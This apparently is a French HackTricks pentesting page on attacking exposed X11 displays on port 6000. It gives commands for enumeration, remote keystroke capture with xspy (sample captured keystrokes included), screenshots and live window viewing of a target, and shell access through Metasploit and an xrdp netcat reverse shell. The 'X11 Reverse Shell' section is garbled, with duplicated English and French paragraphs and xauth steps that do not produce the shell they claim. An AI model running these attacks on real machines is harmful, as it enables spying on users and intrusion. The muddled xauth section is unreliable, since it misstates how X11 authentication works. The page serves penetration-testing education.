# 6000 - Pentesting X11

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? Ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des hackers exp√©riment√©s et des chasseurs de primes !

**Perspectives de piratage**\
Engagez-vous avec du contenu qui explore les sensations et les d√©fis du piratage

**Actualit√©s de piratage en temps r√©el**\
Restez √† jour avec le monde du piratage rapide gr√¢ce aux actualit√©s et aux informations en temps r√©el

**Derni√®res annonces**\
Restez inform√© des derni√®res primes de bugs lanc√©es et des mises √† jour cruciales de la plateforme

**Rejoignez-nous sur** [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez √† collaborer avec les meilleurs hackers d√®s aujourd'hui !

## Informations de base

Le syst√®me X Window (alias X) est un syst√®me de fen√™trage pour les affichages bitmap, qui est courant sur les syst√®mes d'exploitation bas√©s sur UNIX. X fournit le cadre de base pour un environnement bas√© sur une interface graphique (GUI). X ne sp√©cifie pas non plus l'interface utilisateur - chaque programme g√®re cela.\
Source : [https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref](https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref)

**Port par d√©faut :** 6000
```
PORT       STATE   SERVICE
6000/tcp   open    X11
```
## √ânum√©ration

V√©rifiez la **connexion anonyme :**
```bash
nmap -sV --script x11-access -p <PORT> <IP>
msf> use auxiliary/scanner/x11/open_x11
```
#### √ânum√©ration locale

Le fichier **`.Xauthority`** dans le dossier personnel de l'utilisateur est **utilis√©** par **X11 pour l'autorisation**. D'apr√®s [**ici**](https://stackoverflow.com/a/37367518):

> MIT-magic-cookie-1: G√©n√©ration de 128 bits de cl√© ("cookie"), stockage dans \~/.Xauthority (ou l√† o√π la variable d'environnement XAUTHORITY pointe). Le client l'envoie au serveur en clair ! Le serveur v√©rifie s'il a une copie de ce "cookie" et si c'est le cas, la connexion est autoris√©e. La cl√© est g√©n√©r√©e par DMX.

{% hint style="warning" %}
Pour **utiliser le cookie**, vous devez d√©finir la variable d'environnement : **`export XAUTHORITY=/chemin/vers/.Xauthority`**
{% endhint %}

## V√©rification de la connexion
```bash
xdpyinfo -display <ip>:<display>
xwininfo -root -tree -display <IP>:<display> #Ex: xwininfo -root -tree -display 10.5.5.12:0
```
## Keyloggin

[xspy](http://tools.kali.org/sniffingspoofing/xspy) pour intercepter les frappes du clavier.

Exemple de sortie :
```
xspy 10.9.xx.xx

opened 10.9.xx.xx:0 for snoopng
swaBackSpaceCaps_Lock josephtTabcBackSpaceShift_L workShift_L 2123
qsaminusKP_Down KP_Begin KP_Down KP_Left KP_Insert TabRightLeftRightDeletebTabDownnTabKP_End KP_Right KP_Up KP_Down KP_Up KP_Up TabmtminusdBackSpacewinTab
```
## Capture d'√©cran

Lors de la r√©alisation d'un test de p√©n√©tration sur un serveur X11, il peut √™tre utile de capturer des captures d'√©cran pour documenter les vuln√©rabilit√©s d√©couvertes. Les captures d'√©cran peuvent √©galement √™tre utilis√©es pour illustrer les r√©sultats du test de mani√®re visuelle.

Pour capturer des captures d'√©cran sur un serveur X11, vous pouvez utiliser l'outil `xwd`. Cet outil est g√©n√©ralement inclus dans les distributions Linux.

Pour capturer une capture d'√©cran, ouvrez un terminal et ex√©cutez la commande suivante :

```
xwd -root -out screenshot.xwd
```

Cette commande capturera une capture d'√©cran de l'affichage racine du serveur X11 et l'enregistrera dans un fichier appel√© `screenshot.xwd`.

Une fois que vous avez captur√© la capture d'√©cran, vous pouvez la visualiser en utilisant l'outil `xwud`. Pour afficher la capture d'√©cran, ex√©cutez la commande suivante :

```
xwud -in screenshot.xwd
```

Cette commande ouvrira une fen√™tre affichant la capture d'√©cran captur√©e.

Il est important de noter que la capture d'√©cran peut contenir des informations sensibles, telles que des mots de passe ou des donn√©es confidentielles. Assurez-vous de traiter les captures d'√©cran avec pr√©caution et de les supprimer une fois qu'elles ne sont plus n√©cessaires.
```bash
xwd -root -screen -silent -display <TargetIP:0> > screenshot.xwd
convert screenshot.xwd screenshot.png
```
## Affichage du bureau √† distance

Source : [https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref](https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref)
```
./xrdp.py <IP:0>
```
Voici comment trouver l'ID de la fen√™tre en utilisant xwininfo.
```
xwininfo -root -display 10.9.xx.xx:0

xwininfo: Window id: 0x45 (the root window) (has no name)

Absolute upper-left X:  0
Absolute upper-left Y:  0
Relative upper-left X:  0
Relative upper-left Y:  0
Width: 1024
Height: 768
Depth: 16
Visual: 0x21
Visual Class: TrueColor
Border width: 0
Class: InputOutput
Colormap: 0x20 (installed)
Bit Gravity State: ForgetGravity
Window Gravity State: NorthWestGravity
Backing Store State: NotUseful
Save Under State: no
Map State: IsViewable
Override Redirect State: no
Corners:  +0+0  -0+0  -0-0  +0-0
-geometry 1024x768+0+0
```
**XWatchwin**

Pour **visualiser en direct**, nous devons utiliser
```bash
./xwatchwin [-v] [-u UpdateTime] DisplayName { -w windowID | WindowName } -w window Id is the one found on xwininfo
./xwatchwin 10.9.xx.xx:0 -w 0x45
```
## Obtenir un Shell

To get a shell on a target machine, you can exploit vulnerabilities in the X11 server. The X11 server is responsible for managing graphical user interfaces on Unix-like operating systems.

Pour obtenir un shell sur une machine cible, vous pouvez exploiter les vuln√©rabilit√©s du serveur X11. Le serveur X11 est responsable de la gestion des interfaces utilisateur graphiques sur les syst√®mes d'exploitation de type Unix.

### X11 Forwarding

X11 Forwarding is a feature that allows you to run graphical applications on a remote machine and display them on your local machine. By enabling X11 Forwarding, the remote machine can send the graphical output to your local machine.

La redirection X11 est une fonctionnalit√© qui vous permet d'ex√©cuter des applications graphiques sur une machine distante et de les afficher sur votre machine locale. En activant la redirection X11, la machine distante peut envoyer la sortie graphique vers votre machine locale.

To enable X11 Forwarding, you need to set the `DISPLAY` environment variable to the IP address of your local machine followed by `:0.0`. For example:

Pour activer la redirection X11, vous devez d√©finir la variable d'environnement `DISPLAY` sur l'adresse IP de votre machine locale suivie de `:0.0`. Par exemple :

```bash
export DISPLAY=192.168.0.100:0.0
```

### X11 Reverse Shell

To get a reverse shell using X11, you can exploit the `xauth` command. The `xauth` command is used to edit and display the authorization information used in connecting to the X server.

Pour obtenir un shell invers√© en utilisant X11, vous pouvez exploiter la commande `xauth`. La commande `xauth` est utilis√©e pour modifier et afficher les informations d'autorisation utilis√©es pour se connecter au serveur X.

First, you need to generate a new X11 authentication cookie using the following command:

Tout d'abord, vous devez g√©n√©rer un nouveau cookie d'authentification X11 √† l'aide de la commande suivante :

```bash
xauth generate :1 . trusted
```

Next, you can use the `xauth` command to extract the generated cookie and send it to your local machine:

Ensuite, vous pouvez utiliser la commande `xauth` pour extraire le cookie g√©n√©r√© et l'envoyer √† votre machine locale :

```bash
xauth extract - :1 | base64
```

On your local machine, you can decode the received cookie using the following command:

Sur votre machine locale, vous pouvez d√©coder le cookie re√ßu √† l'aide de la commande suivante :

```bash
echo <base64_encoded_cookie> | base64 -d
```

Finally, you can use the extracted cookie to connect to the target machine and get a reverse shell:

Enfin, vous pouvez utiliser le cookie extrait pour vous connecter √† la machine cible et obtenir un shell invers√© :

```bash
export DISPLAY=<target_ip>:1
xauth add <extracted_cookie>
xterm &
```

This will open an Xterm window on your local machine, which is actually running on the target machine. You can now execute commands in the Xterm window, and the output will be displayed on your local machine.

Cela ouvrira une fen√™tre Xterm sur votre machine locale, qui s'ex√©cute en r√©alit√© sur la machine cible. Vous pouvez maintenant ex√©cuter des commandes dans la fen√™tre Xterm et la sortie sera affich√©e sur votre machine locale.
```
msf> use exploit/unix/x11/x11_keyboard_exec
```
Autre m√©thode:

**Reverse Shell:** Xrdp permet √©galement de prendre un reverse shell via Netcat. Tapez la commande suivante:

**./xrdp.py \<IP:0> ‚Äìno-disp**

![](../.gitbook/assets/112217\_0051\_ExploitingX15.jpeg)

Une nouvelle fen√™tre de contr√¥le s'affiche o√π nous pouvons voir l'option R-shell, comme illustr√© ci-dessous:

![](../.gitbook/assets/112217\_0051\_ExploitingX16.jpeg)

Nous allons d√©marrer le mode d'√©coute de Netcat sur notre syst√®me local sur le port 5555, comme illustr√© ci-dessous:

![](../.gitbook/assets/112217\_0051\_ExploitingX17.jpeg)

Ensuite, ajoutez l'adresse IP et le port, puis s√©lectionnez R-Shell, comme illustr√© ci-dessous:

![](../.gitbook/assets/112217\_0051\_ExploitingX18.jpeg)

Maintenant, comme on peut le voir ci-dessous, nous avons un acc√®s complet au syst√®me:

![](../.gitbook/assets/112217\_0051\_ExploitingX19.jpeg)

{% embed url="https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref" %}

## Shodan

* `port:6000 x11`

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des hackers exp√©riment√©s et des chasseurs de primes!

**Perspectives de piratage**\
Engagez-vous avec du contenu qui explore les sensations et les d√©fis du piratage

**Actualit√©s de piratage en temps r√©el**\
Restez √† jour avec le monde du piratage rapide gr√¢ce aux actualit√©s et aux informations en temps r√©el

**Derni√®res annonces**\
Restez inform√© des derni√®res primes de bugs lanc√©es et des mises √† jour cruciales de la plateforme

**Rejoignez-nous sur** [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez √† collaborer avec les meilleurs hackers d√®s aujourd'hui!

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Vous travaillez dans une **entreprise de cybers√©curit√©** ? Vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ? ou souhaitez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
